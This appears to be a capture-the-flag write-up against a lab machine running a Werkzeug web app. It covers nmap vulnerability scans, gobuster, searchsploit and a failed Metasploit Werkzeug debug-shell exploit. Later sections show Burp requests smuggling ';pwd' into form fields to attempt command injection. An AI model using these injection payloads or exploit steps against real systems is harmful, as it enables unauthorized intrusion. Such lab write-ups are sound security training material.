# Summary
### 1. NMAP

### 2. Port 5000 HTTP Enumeration

# Attack
## 1. NMAP
Took a long time to run, but here it is.
```
hippoeug@kali:~$ nmap --script vuln 10.129.72.251 -sC -sV -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 12:40 +08
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
|_      CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.72.251
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.72.251:5000/
|     Form id: ip
|     Form action: /
|     
|     Path: http://10.129.72.251:5000/
|     Form id: os
|     Form action: /
|     
|     Path: http://10.129.72.251:5000/
|     Form id: search
|_    Form action: /
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Failed to upload and execute a payload.
|   
|_    Failed to upload and execute a payload.
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:3.8.5: 
|       CVE-2021-3177   7.5     https://vulners.com/cve/CVE-2021-3177
|       CVE-2020-27619  7.5     https://vulners.com/cve/CVE-2020-27619
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_UDP/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_UDP/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP_SSL/       0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP_SSL/        *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/PINGBACK_REVERSE_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/PINGBACK_REVERSE_TCP/ *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTPS/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTPS/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTP/    0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTP/     *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_BIND_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_BIND_TCP/ *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER/REVERSE_HTTP/    0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/REVERSE_HTTP/     *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP_UUID/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP_UUID/    *EXPLOIT*
|_      MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP/ *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Okay, so we know 2 ports opened, Port 22 SSH and a Port 5000 HTTP port. This Port 5000 is an interesting one, showing it's a Werkzeug httpd 0.16.1 (Python 3.8.5).

## 2. Port 5000 HTTP Enumeration
Let's visit `http://10.129.72.251:5000/` and see what we get.
```
k1d'5 h4ck3r t00l5
nmap
scan top 100 ports on an ip
ip:

payloads
venom it up - gen rev tcp meterpreter bins
os:
lhost:
template file (optional):

sploits
searchsploit FTW
search:
```
Ah, a website that basically runs NMAP, MSFVenom, & SearchSploit for you. So theoritically, this web interface is directly connected to a actual Kali Linux machine? If badly configured, we can run direct commands to it! 

Anyways, let's try one of them NMAP. We will scan itself, META AF.
```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 04:43 UTC
Nmap scan report for 10.129.72.251
Host is up (0.00019s latency).
Not shown: 98 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
```
It worked!

While we're at it, we run a quick GoBuster to see what we get.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.72.251:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.72.251:5000
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/07 12:51:30 Starting gobuster
===============================================================
===============================================================
2021/02/07 13:10:26 Finished
===============================================================
```
Nothing, no sub-directories.

Let's do a SearchSploit.
```
hippoeug@kali:~$ searchsploit werkzeug
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Werkzeug - 'Debug Shell' Command Execution                                                                                          | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                               | python/remote/37814.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Since there is a Metasploit module, let's give this a shot real quick.
```
msf5 > use exploit/multi/http/werkzeug_debug_rce
[*] No payload configured, defaulting to python/meterpreter/reverse_tcp
msf5 exploit(multi/http/werkzeug_debug_rce) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   werkzeug 0.10 and older


msf5 exploit(multi/http/werkzeug_debug_rce) > show options
...
msf5 exploit(multi/http/werkzeug_debug_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[-] Secret code not detected.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/werkzeug_debug_rce) > 
```
Unfortunately, our version is newer and would not work!

## 3. Port 5000 HTTP Attack Attempt 1
Let's run Burp Suite and try to see what we get when running a the NMAP function.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close
Upgrade-Insecure-Requests: 1

ip=127.0.0.1&action=scan
```
Interesting, let's try to run multiple commands by modifying the request on BurpSuite. 

We will use CyberChef URL Encode/Decode function, where `;` is `%3B`.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%3Bpwd&action=scan
```
Unforunately, this didn't work and we get an error `invalid ip`.

Another attempt at running another function SPLOITS.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Upgrade-Insecure-Requests: 1

search=werkzeug&action=searchsploit
```
And we change it on BurpSuite.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Upgrade-Insecure-Requests: 1

search=werkzeug%3Bpwd&action=searchsploit
```
This time however, we get an error `stop hacking me - well hack you back`.
